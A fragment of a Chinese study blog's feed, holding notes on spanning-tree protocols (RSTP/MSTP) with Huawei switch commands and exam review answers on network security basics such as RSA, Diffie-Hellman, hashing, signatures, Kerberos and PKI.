class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备边缘端口的BPDU保护功能。缺省情况下，交换设备的BPDU保护功能处于禁用状态。</p><p><strong>配置根保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp root-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备的根保护功能。缺省情况下，端口的根保护功能处于去使能状态。当端口的角色是指定端口时，配置的根保护功能才生效。配置了根保护的端口，不可以配置环路保护</p><p><strong>配置环路保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp loop-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备根端口或Alternate端口的环路保护功能。缺省情况下，端口的环路保护功能处于关闭状态</p><p><strong>配置TC保护功能</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp tc-protection interval interval-value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置设备处理阈值指定数量的拓扑变化报文所需的时间。缺省情况下，设备处理最大数量的拓扑变化报文所需的时间是Hello Time</p><h4 id="RSTP与STP的不足"><a href="#RSTP与STP的不足" class="headerlink" title="RSTP与STP的不足"></a>RSTP与STP的不足</h4><blockquote><p>流量无法负载分担 和 二层次优路径</p></blockquote><h2 id="多生成树协议（MSTP）"><a href="#多生成树协议（MSTP）" class="headerlink" title="多生成树协议（MSTP）"></a>多生成树协议（MSTP）</h2><blockquote><p>MSTP是IEEE 802.1S中定义的生成树协议，MSTP兼容STP和RSTP，既可以快速收敛，又提供了数据转发的多个冗余路径，在数据转发过程中实现VLAN数据的负载均衡</p></blockquote><p>MSTP可以将一个或多个VLAN映射到一个Instance（实例），再基于Instance计算生成树，映射到同一个Instance的VLAN共享同一棵生成树</p><h3 id="MSTP的基本概念"><a href="#MSTP的基本概念" class="headerlink" title="MSTP的基本概念"></a>MSTP的基本概念</h3><h4 id="MST-Region"><a href="#MST-Region" class="headerlink" title="MST Region"></a>MST Region</h4><ul><li><p>MSTP网络层次：</p><ul><li>MSTP把一个交换网络划分成多个域，每个域内形成多棵生成树，生成树之间彼此独立。</li></ul></li><li><p>MST Region（Multiple Spanning Tree Region，多生成树域），也可简称MST域</p><ul><li>由交换网络中的多台交换设备以及它们之间的网段所构成</li><li>一个局域网可以存在多个MST域，各MST域之间在物理上直接或间接相连。用户可以通过MSTP配置命令把多台交换设备划分在同一个MST域内</li><li>MSTP网络中包含1个或多个MST域，每个MST域中包含一个或多个多生成树实例。</li></ul></li><li><p>同一个MST域的设备具有下列特点：</p><ul><li>都启动了MSTP，具有相同的域名，具有相同的VLAN到生成树实例映射配置，具有相同的MSTP修订级别配置</li></ul></li></ul><h4 id="MSTI"><a href="#MSTI" class="headerlink" title="MSTI"></a>MSTI</h4><p>Multiple Spanning Tree Instance，多生成树实例：一个MST域内可以生成多棵生成树，每棵生成树都称为一个MSTI，MSTI使用Instance ID标识，华为设备取值为0~4094。</p><ul><li><p><strong>VLAN映射表</strong><br>MST域的属性，描述了VLAN和MSTI之间的映射关系。<br>如图所示的MST Region 4的VLAN映射有：</p><center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\MST域与.png" style="zoom:67%;" />    ----->>>        <img src="D:\blog\shierjinghuang\source\_posts\生成树协议\多生成树实例.png" alt="多生成树实例" style="zoom: 67%;" /></center></li><li><p>VLAN1映射到MSTI 1，VLAN2映射到MSTI 2，其余VLAN映射到MSTI 3</p></li><li><p>Instance0是缺省存在的，而且缺省时，华为交换机上所有的VLAN都映射到了Instance0。</p></li><li><p>通过设置VLAN映射表，把VLAN和MSTI联系起来</p><p>每个VLAN只能对应一个MSTI，即同一VLAN的数据只能在一个MSTI中传输，而一个MSTI可能对应多个VLAN</p></li></ul><h4 id="CST（Common-Spanning-Tree，公共生成树）"><a href="#CST（Common-Spanning-Tree，公共生成树）" class="headerlink" title="CST（Common Spanning Tree，公共生成树）"></a>CST（Common Spanning Tree，公共生成树）</h4><p>是连接交换网络内所有MST域的一棵生成树。<br>如果把每个MST域看作是一个节点，CST就是这些节点通过生成树协议计算生成的一棵生成树。</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\交换网络实例.png" alt="交换网络实例" style="zoom: 50%;" /><p>如图深蓝色粗线条连接各个域构成CST。</p><p>IST（Internal Spanning Tree，内部生成树）<br>是各MST域内的一棵生成树。<br>IST是一个特殊的MSTI，MSTI的Instance ID为0。<br>如图所示的MST Region 4，黑色细线条在域中连接该域的所有交换设备构成IST。</p><p>CIST（Common and Internal Spanning Tree，公共和内部生成树）<br>通过生成树协议计算生成的，连接一个交换网络内所有交换设备的单生成树。<br>如图所示，所有MST域的IST加上CST就构成一棵完整的生成树，即CIST。</p><h3 id="MSTP的端口"><a href="#MSTP的端口" class="headerlink" title="MSTP的端口"></a>MSTP的端口</h3><h4 id="MSTP端口角色"><a href="#MSTP端口角色" class="headerlink" title="MSTP端口角色"></a>MSTP端口角色</h4><blockquote><p>MSTP中定义的所有端口角色包括：根端口、指定端口、Alternate端口、Backup端口、Master端口、域边缘端口和边缘端口</p></blockquote><table><thead><tr><th>端口角色</th><th align="left">说明</th></tr></thead><tbody><tr><td>根端口</td><td align="left">在非根桥上，离根桥最近的端口是本交换设备的根端口。根端口负责向树根方向转发数据</td></tr><tr><td>指定端口</td><td align="left">对一台交换设备而言，它的指定端口是向下游交换设备转发BPDU报文的端口。</td></tr><tr><td>Alternate端口</td><td align="left">从配置BPDU报文发送角度来看，Alternate端口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的端口。从用户流量角度来看，Alternate端口提供了从指定桥到根的另一条可切换路径，作为根端口的备份端口。</td></tr><tr><td>Backup端口</td><td align="left">从配置BPDU报文发送角度来看，Backup端口就是由于学习到自己发送的配置BPDU报文而阻塞的端口。从用户流量角度来看，Backup端口作为指定端口的备份，提供了另外一条从根节点到叶节点的备份通路</td></tr></tbody></table><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\MSTP端口角色.png" alt="MSTP端口角色" style="zoom:80%;" /><table><thead><tr><th><strong>端口角色</strong></th><th align="left">说明</th></tr></thead><tbody><tr><td>Master端口</td><td align="left">Master端口是MST域和总根相连的所有路径中最短路径上的端口，它是交换设备上连接MST域到总根的端口。Master端口是域中的报文去往总根的必经之路。Master端口是特殊域边缘端口，Master端口在CIST上的角色是Root Port，在其它各实例上的角色都是Master端口</td></tr><tr><td>域边缘端口</td><td align="left">域边缘端口是指位于MST域的边缘并连接其它MST域或SST的端口。</td></tr></tbody></table><table><thead><tr><th>端口角色</th><th>说明</th></tr></thead><tbody><tr><td>边缘端口</td><td>如果指定端口位于整个域的边缘，不再与任何交换设备连接，这种端口叫做边缘端口。边缘端口一般与用户终端设备直接连接</td></tr></tbody></table><h4 id="MSTP的端口状态"><a href="#MSTP的端口状态" class="headerlink" title="MSTP的端口状态"></a>MSTP的端口状态</h4><p>MSTP定义的端口状态与RSTP协议中定义相同:<br>Forwarding状态：端口既转发用户流量，学习MAC地址，又接收/发送BPDU报文。<br>Learning状态：过渡状态，端口接收/发送BPDU报文，不转发用户流量但是学习MAC地址。<br>Discarding状态：端口只接收BPDU报文，不转发用户流量也不学习MAC地址。</p><table><thead><tr><th>MSTP端口状态</th><th>端口在拓扑中的角色</th></tr></thead><tbody><tr><td><strong>Forwarding</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口</td></tr><tr><td><strong>Learning</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口</td></tr><tr><td><strong>Discarding</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口、Alternate端口、Backup端口</td></tr></tbody></table><p>MSTP报文</p><p>MSTP使用MST BPDU（Multiple Spanning Tree Bridge Protocol Data Unit，多生成树桥协议数据单元）作为生成树计算的依据。<br>MST BPDU报文用来计算生成树的拓扑、维护网络拓扑以及传达拓扑变化记录。</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1678337096467.png"></p><p>无论是域内的MST BPDU还是域间的，前36个字节和RST BPDU相同。从第37个字节开始是MSTP专有字段。最后的MSTI配置信息字段由若干MSTI配置信息组连缀而成。<br>MST BPDU中主要信息说明：<br>Protocol Identifier：2 Byte，协议标识符。<br>Protocol Version Identifier：1 Byte，协议版本标识符，STP为0，RSTP为2，MSTP为3。<br>BPDU Type：1 Byte，BPDU类型：<br>0x00：STP的Configuration BPDU<br>0x80：STP的TCN BPDU（Topology Change Notification BPDU）<br>0x02：RST BPDU（Rapid Spanning-Tree BPDU）或者MST BPDU（Multiple Spanning-Tree BPDU）<br>CIST Flags：1 Byte，CIST标志字段。<br>CIST Root Identifier：8 Byte，CIST的总根交换设备ID。<br>CIST External Path Cost：4 Byte，CIST外部路径开销指从本交换设备所属的MST域到CIST根交换设备所属的MST域的累计路径开销。CIST外部路径开销根据链路带宽计算。</p><p>CIST Regional Root Identifier：8 Byte，CIST的域根交换设备ID，即IST Master的ID。如果总根在这个域内，那么域根交换设备ID就是总根交换设备ID。<br>CIST Port Identifier：2 Byte，本端口在IST中的指定端口ID。<br>Message Age：2 Byte，BPDU报文的生存期。<br>Max Age：2 Byte，BPDU报文的最大生存期，超时则认为到根交换设备的链路故障。<br>Hello Time：2 Byte，Hello定时器，缺省为2秒。<br>Forward Delay：2 Byte，Forward Delay定时器，缺省为15秒。<br>Version 1 Length：1 Byte，Version1 BPDU的长度，值固定为0。<br>Version 3 Length：2 Byte，Version3 BPDU的长度。<br>MST Configuration Identifier：51 Byte，MST配置标识，表示MST域的标签信息，包含4个字段。<br>CIST Internal Root Path Cost：4 Byte，CIST内部路径开销指从本端口到IST Master交换设备的累计路径开销。CIST内部路径开销根据链路带宽计算。<br>CIST Bridge Identifier：8 Byte，CIST的指定交换设备ID。<br>CIST Remaining Hops：1 Byte，BPDU报文在CIST中的剩余跳数。<br>MSTI Configuration Messages：16 Byte，MSTI配置信息。每个MSTI的配置信息占16 Byte，如果有n个MSTI就占用n×16 Byte。</p><p>MSTP的工作原理</p><p>MSTP拓扑计算：<br>MSTP可以将整个二层网络划分为多个MST域，各个域之间通过计算生成CST，域内生成IST，CST和IST构成了整个交换设备网络的CIST。<br>域内还可以基于实例计算生成多棵生成树，每棵生成树都被称为是一个MSTI。<br>CIST和MSTI都是根据优先级向量来计算的，这些优先级向量信息都包含在MST BPDU中。各交换设备互相交换MST BPDU来生成CIST和MSTI 。<br>参与CIST计算的优先级向量为：<br>{ 根交换设备ID，外部路径开销，域根ID，内部路径开销，指定交换设备ID，指定端口ID，接收端口ID }<br>参与MSTI计算的优先级向量为：<br>{ 域根ID，内部路径开销，指定交换设备ID，指定端口ID，接收端口ID }</p><p>优先级向量说明：<br>根交换设备ID：根交换设备ID用于选择CIST中的根交换设备。<br>根交换设备ID = Priority(16 bit) + MAC(48 bit)。<br>其中Priority为MSTI0的优先级。<br>外部路径开销（External Root Path Cost，ERPC）：从CIST的域根到达总根的路径开销。<br>MST域内所有交换设备上保存的外部路径开销相同。<br>若CIST根交换设备在域中，则域内所有交换设备上保存的外部路径开销为0。<br>域根ID：域根ID用于选择MSTI中的域根。<br>域根ID = Priority(16 bit) + MAC(48 bit)。<br>其中Priority为MSTI0的优先级。<br>内部路径开销（Internal Root Path Cost，IRPC）：本桥到达域根的路径开销。<br>域边缘端口保存的内部路径开销大于非域边缘端口保存的内部路径开销。<br>指定交换设备ID：CIST或MSTI实例的指定交换设备是本桥通往域根的最邻近的上游桥。<br>如果本桥就是总根或域根，则指定交换设备为自己。<br>指定端口ID：指定交换设备上同本设备上根端口相连的端口。<br>Port ID = Priority(4 bit) + 端口号（12 bit）。<br>端口优先级必须是16的整数倍。<br>接收端口ID：接收到BPDU报文的端口。<br>Port ID = Priority(4 bit) + 端口号（12 bit）。<br>端口优先级必须是16的整数倍。</p><p>优先级向量比较原则：<br>同一向量比较，值最小的向量具有最高优先级。<br>优先级向量比较原则如下<br>首先，比较根交换设备ID。<br>如果根交换设备ID相同，再比较外部路径开销。<br>如果外部路径开销相同，再比较域根ID。<br>如果域根ID仍然相同，再比较内部路径开销。<br>如果内部路径仍然相同，再比较指定交换设备ID。<br>如果指定交换设备ID仍然相同，再比较指定端口ID。<br>如果指定端口ID还相同，再比较接收端口ID。<br>如果端口接收到的BPDU内包含的配置消息优于端口上保存的配置消息，则端口上原来保存的配置消息被新收到的配置消息替代。端口同时更新交换设备保存的全局配置消息。反之，新收到的BPDU被丢弃。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;生成树的改进-RSTP与MSTP&quot;&gt;&lt;a href=&quot;#生成树的改进-RSTP与MSTP&quot; class=&quot;headerlink&quot; title=&quot;生成树的改进 RSTP与MSTP&quot;&gt;&lt;/a&gt;生成树的改进 RSTP与MSTP&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络安全思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/"/>
    <id>https://shierjinghuang.github.io/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/</id>
    <published>2023-03-03T01:12:38.000Z</published>
    <updated>2023-03-05T10:27:40.493Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机网络安全思考题："><a href="#计算机网络安全思考题：" class="headerlink" title="计算机网络安全思考题："></a>计算机网络安全思考题：</h2><h3 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h3><h4 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong>计算机网络安全的概念是什么？网络安全有哪几个特征？各特征的含义是什么？</strong></p><ul><li>网络安全指网络系统的软件硬件、以及系统存储和传输中的数据收到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常的运行，网络服务不中断。</li><li>网络安全的特征及含义：<ul><li>机密性： 指保证信息与信息系统不被非授权的用户实体或过程所获取与使用</li><li>完整性： 指信息在生成、传输、存储和使用过程中不应被第三方篡改</li><li>可用性 ：指信息与信息系统可被授权实体正常访问的特性，即授权实体在需要时能够存取所需信息</li><li>可控性 ：对信息的存取和传播具有完全的控制能力，可以控制信息的流向和行为方式</li><li>真实性 ： 包括信息的完整性，准确性和发送人的身份真实性等方面</li></ul></li></ul></li><li><p><strong><font color=red>列出并简述主动攻击与被动攻击的分类</font></strong> </p><p><font color=orange>被动攻击:    试图获取和使用系统中的信息 ，但是不会对系统的资源产生破坏，包括消息内容泄露和流量分析</font></p><p><font color=orange>主动攻击： 试图改变系统的资源或者伪装成系统中的合法用户进行操作， 包括假冒，重传，篡改和拒绝服务</font></p></li><li><p><strong>网络安全体系包括哪几个部分？各部分又由哪几个方面组成？</strong></p><ul><li>网络安全体系由网络安全技术体系、网络安全组织体系、网络安全管理体系三部分组成</li><li>网络安全技术体系包括：物理安全、计算机系统平台安全、通信安全、应用系统安全</li><li>网络安全组织体系： 网络安全组织体系是多个网络安全组织按照一定的关系汇集形成的一套组织系统<ul><li>我国的网络安全组织体系，一是国家信息安全管理、协调或服务组织系统，二是各政府机构内设的专门承担信息安全管理或服务工作的实体或虚体机构。</li></ul></li><li>网络安全管理体系由法律管理，制度管理和培训管路3个部分组成</li></ul></li></ul><h3 id="第二章-密码学"><a href="#第二章-密码学" class="headerlink" title="第二章 密码学"></a>第二章 密码学</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 古典密码学维吉尼亚密码与希尔密码</span><span class="token comment"># 如何利用公钥密码技术实现即加密又认证</span><span class="token comment"># 如何利用公钥密码技术实现混合加密</span><span class="token comment"># 本章重点：Diffe-Hellman 秘钥交换协议 D-h的中间人攻击（简答）</span><span class="token comment"># Diffe-Hellman安全性分析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="计算题："><a href="#计算题：" class="headerlink" title="计算题："></a>计算题：</h4><h5 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h5><p>该密码体制有一个参数n。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按n个字母一组进行变换。明文空间、密文空间及密钥空间都是长度为n的英文字母串的集合，因此可表示 </p><blockquote><p>加密变换定义如下：</p><p>设密钥 k=(k1,k2,…,kn), 明文m=(m1,m2,…,mn), 加密变换为：Ek(m)=(c1,c2,…,cn), 其中ci(mi + ki)(mod26)，i =1,2,…,n</p><p>对密文 c=(c1,c2,…,cn),  解密变换为：Dk(c)=(m1,m2,…,mn), 其中 mi=(ci －ki)(mod26)，i =1,2,…,n</p></blockquote><h5 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h5><blockquote><p>Hill密码算法的基本思想是将n个明文字母通过线性变换，将它们转换为n个密文字母，解密即做逆变换</p></blockquote><p>算法的密钥K ={ <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1676351740534.png" style="zoom:67%;" />上的N·N的可逆矩阵}，明文M与密文C均为n维向量</p><p>其中：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算.png" style="zoom: 67%;" /><p>有</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算矩阵形式.png" style="zoom: 80%;" /><p>或写成</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码加密.png" style="zoom:67%;" /><p>解密变换则为：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码解密.png" style="zoom:67%;" /><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><ul><li><p>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， ψ(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (ψ(n)，e) =1,   1&lt;e&lt; ψ(n) </li><li>计算d，使d = e－1mod ψ(n),</li><li>得到：公钥 为{e,n}； 私钥为{d}</li></ol></li><li><p>加密(用e，n):         明文：M &lt; n， 密文C = M ^ e(mod n)</p></li><li><p>解密(用d，n)：      密文C， 明文M = C ^ d (mod n)</p></li></ul><h5 id="Diffe-Hellman-秘钥交换协议"><a href="#Diffe-Hellman-秘钥交换协议" class="headerlink" title="Diffe-Hellman 秘钥交换协议"></a>Diffe-Hellman 秘钥交换协议</h5><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/Diffe-Hellman 秘钥交换协议.png" style="zoom: 67%;" /><h4 id="综合题："><a href="#综合题：" class="headerlink" title="综合题："></a>综合题：</h4><ul><li><p><strong><font color=orange>如何利用公钥密码技术实现    即加密又认证 （综合题）</font></strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/公钥密码技术实现加密及认证.png" style="zoom:50%;" /><p>提供保密：KUb        提供鉴别和签名:KRa    明文消息M</p><blockquote><p><font color=orange>Alice用自己的私钥进行数字签名，并与源文件一起用Bob的私钥进行加密</font></p><p><font color=orange>Bob在收到数据后用自己的私钥进行解密，并可以用Alice的公钥进行验证</font></p></blockquote></li><li><p><strong><font color=orange>如何利用公钥密码技术实现    混合加密 （综合题）</font></strong></p></li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/混合加密计算.png" style="zoom: 50%;" /><ul><li><p><strong><font color=orange>Diffe-Hellman安全性分析 (综合题)</font></strong></p><blockquote><p>网络安全课本P55页</p></blockquote><ul><li><p>Diffie-Hellman算法的优点:</p><ol><li>仅当需要时才生成密钥,减小了将密钥存储很长一段时间而致使遭受攻击的机会</li><li>除对全局参数的约定外,密钥交换不需要事先存在的基础结构</li></ol></li><li><p>缺点：</p><ol><li>在协商密钥的过程中,没有对双方身份的认证</li><li>它是计算密集性的,因此容易遭受阻塞性攻击:攻击方请求大量的密钥,而受攻击者花费了相对多的计算资源来求解无用的幂系数而不是在做真正的工作</li><li>没办法防止重放攻击</li><li>容易遭受”中间人攻击”，即恶意第三方C在和A通信时扮演B,和B通信时扮演A,与A和B都协商了一个密钥,然后C就可以监听和传递通信量</li></ol></li></ul></li></ul><h4 id="思考题：-1"><a href="#思考题：-1" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong><font color=red>简述密码体制及其组成成分：</font></strong></p><ul><li>用于加解密并能解决网络安全中的机密性、完整性、可用性、可控性和真实性等问题中的一个或几个的系统称为密码体制</li><li>包括密文空间C，明文空间P，秘钥空间K , 加密算法E，与解密算法D</li></ul></li><li><p><strong>简述对称密码算法的基本原理</strong></p><ul><li>对称算法又叫传统密码算法:加密密钥能够从解密密钥中推算出来,反过来也成立。</li><li>对称算法要求发送者和接收者在安全通信之前,协商一个密钥。</li><li>对称算法的安全性依赖于密钥,泄漏密钥就意味着任何人都能对消息进行加解密。</li><li>对称算法的加密和解密表示为:EK(M)=C </li></ul></li><li><p><strong>简述对称密码算法和非对称密码算法的区别：</strong></p><ul><li><p>在对称密码体制中，加密和解密使用完全相同的秘钥，或者加密秘钥和解密秘钥彼此之间非常容易推导。在公钥密码体系中，加密和解密使用不同的秘钥，而且由其中的一个推导另一个是非常困难的。在两个秘钥中，一个是公开的，而另一个保持秘密性<del>（老师表示这个答案有错）</del></p></li><li><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这部分来自密码学课件，至少比课本上全面</span>对称秘钥密码体制：加密、解密运算的处理速度块，效率高，算法安全性高，对称密码算法的密钥分发过程复杂，所花代价高； 密钥管理量的困难；保密通信系统的开放性差； 存在数字签名的困难性非对称密码体制：密钥分配简单，系统密钥量少，便于管理 ，系统开放性好，且可以实现数字签名。加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong><font color=red>RSA算法的理论基础是什么？简述RSA算法的流程？</font></strong></p><ul><li>大整数的素因子分解是困难问题，即求两个大素数的乘积是容易的，但是将一个大整数分解成两个大素数之积则是困难的<ul><li>选取两个大素数p和q，两个数长度接近，一般在256比特长</li><li>计算n=p * q, ψ(n)=(p-1)(q-1)</li><li>随机选取整数e，满足gcd(e, ψ(n))=1</li><li>计算d，满足d*e=1（modψ(n)）</li><li>n公开， p和q保密   e为公钥，d为私钥。</li><li>消息m &lt; n<br>加密算法：c=E(m)=m^e   (mod n)<br>解密算法：m=D(c)=c^d   (mod n)<br>签名： s=md(mod n)</li></ul></li></ul></li><li><p> <strong><font color=orange>D-h的中间人攻击（简答）</font></strong></p></li></ul>  <img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/D-h的中间人攻击.png"  /><h3 id="第三章-消息鉴别与数字签名"><a href="#第三章-消息鉴别与数字签名" class="headerlink" title="第三章 消息鉴别与数字签名"></a>第三章 消息鉴别与数字签名</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 考点：消息加密 ， MAC函数 ， 哈希函数 ， 公钥密码签名等 ， A - B 公钥加密与签名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong>消息鉴别主要用于对抗哪种类型的攻击？</strong></p><ul><li>消息鉴别主要用于对抗伪造消息和篡改消息（包括内容篡改，序号篡改与时间篡改）</li></ul></li><li><p><strong><font color=red>根据鉴别符的生成方式，鉴别函数可分为哪几类？各自具有什么特点？（掌握）</font></strong></p></li><li><p>基于鉴别符的生成方式，鉴别函数可分为如下3类：</p></li><li><p>基于消息加密方式的鉴别：以<strong>整个消息的密文为鉴别符</strong></p><ul><li>基于消息鉴别码（MAC）的鉴别：利用公开函数和秘钥产生一个较短的定长值作为鉴别符，并与消息一同发送给接收方，实现对消息的验证。</li><li>基于散列函数的鉴别：利用公开函数将任意长的消息映射为定长的散列值，并以该散列值作为鉴别符</li></ul></li><li><p><strong><font color=red>散列函数应该具有哪些安全特性？（掌握）</font></strong></p></li><li><p>散列函数必须满足一定的安全特征，主要包括3个方面：单向性、强对抗碰撞性和弱对抗碰撞性</p><ul><li>单向性：对任意给定的散列码h，找到满足H（x）=h的x在计算上是不可行的，即给定散列函数h，由消息M计算散列值H(M)是容易的，但是由散列值H(M)计算</li><li>强对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h，寻找两个不同的消息M1和M2，使得h (M1) = h (M2)在计算上是不可行的</li><li>弱对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h和一个随机的消息M，寻找消息M1使得h (M) = H(M1)在计算上是不可行的。</li></ul></li><li><p><strong><font color=skyblue>什么是数字签名？数字签名具有哪些特征？（理解）</font></strong></p></li><li><p>数字签名是手写签名的数字化形式，是公钥密码学发展过程中最重要的概念之一<del>（是指附加在某一电子文档中的一组特定的符号或代码）</del>  删除线内是课件的内容</p><ul><li>数字签名的特征<ul><li>可验证性：信息接收方必须能够验证发送发的签名是否真实有效</li><li>不可伪造性： 除签名人外，任何人不能伪造签名人的合法签名。</li><li>不可否认性： 发送放在发送签名消息后。无法抵赖发送的行为；接收方在收到消息后，也无法否认接收的行为</li><li>数据完整性： 数字签名使得发送方能够对消息的完整性进行校验<del>（数字签名具有消息鉴别的功能）</del></li></ul></li></ul></li><li><p><strong>简述基于公钥密码的数字签名原理？</strong></p><ul><li>假定接收方已知发送放的公钥，则发送放则可以用自己的私钥对整个消息或消息的散列码加密来产生数字签名，接受放用发送方的公钥对签名进行验证从而确认签名和消息的真实性</li></ul></li></ul><h3 id="第四章-身份认证"><a href="#第四章-身份认证" class="headerlink" title="第四章 身份认证"></a>第四章 身份认证</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># Kerberos    X.509版本3 包含哪一些字段    PKI体系结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h4><p><strong><font color=orange>思考题2,3,4综合复习（？）</font></strong></p><ul><li><p><font color=orange>设计Kerberos是为了解决哪些问题？</font></p></li><li><p>Kerberos的设计目的就是解决分布式网络环境下用户访问网络资源时的安全问题，即工作站的用户希望获得服务器上的服务、服务器能够对服务请求进行认证，并能限制授权用户的访问</p></li><li><p><font color=orange>在Kerberos中，什么是门票？什么是门票分发门票？</font></p><ul><li>用户需要访问远程服务或资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，再将这些信息发送给工作站。该消息包括用远程资源或服务的主密钥加密的会话密钥，以及用户的名字等信息。这部分信息称为访问远程资源的门票**<del>（这部分内容来自课件）</del>**</li><li>工作站向KDC申请会话密钥，KDC生成会话密钥，并发送一个门票分发门票(TGT)给工作站，TGT包括用KDC的主密钥加密的会话密钥，还包括用户名字和会话密钥过期时间等。</li></ul></li><li><p><font color=orange>简述Kerberos用户中用户工作站获得会话秘钥和TTG的过程以及获得服务授权门票的过程</font></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/获得会话秘钥与TGT.png" style="zoom: 50%;" /><p><strong><font color=orange>获取服务授权门票见课本P89</font></strong></p></li><li><p>什么是证书，证书的基本功能是什么？</p><ul><li>证书就是一种经过签名的消息，用来确定某个名字和某个公钥的绑定关系</li></ul></li><li><p>简述X.509双向认证过程</p><ul><li><p style="color:blue;">课本100页大段,因为存在大段公式推荐看课本</p></li></ul></li><li><p>一个完整的PKI应用系统包括哪些组成成分？各自具有什么功能？</p><ul><li>一个完整的PKI应用系统必须包括：权威认证机构（CA）、数字证书库、秘钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分<ul><li>权威认证机构（CA）：是PKI的核心执行机构，是数字证书生成、发放的运行实体，一般情况下也是证书撤销列表(CRL)的发布点</li><li>数字证书库：证书库是CA颁发证书和撤销证书的集中存放地，可以供公众进行开放式查询</li><li>秘钥备份及恢复系统：提供备份与恢复秘钥的机制</li><li>证书作废系统：</li><li>应用接口（API）：提供良好的应用接口系统使得各个的应用程序能够以安全、一致可信的方式与PKI交互</li></ul></li></ul></li></ul><h3 id="第五章-Internet安全"><a href="#第五章-Internet安全" class="headerlink" title="第五章 Internet安全"></a>第五章 Internet安全</h3><h4 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong><font color=skyblue>IPSec提供哪些服务？（考察）</font></strong></p><p style="color:blue;">IPSec将密码技术应用在网络层，提供端对端通信数据的私有性、完整性、真实性、防重放攻击等安全服务</p></li><li><p><strong><font 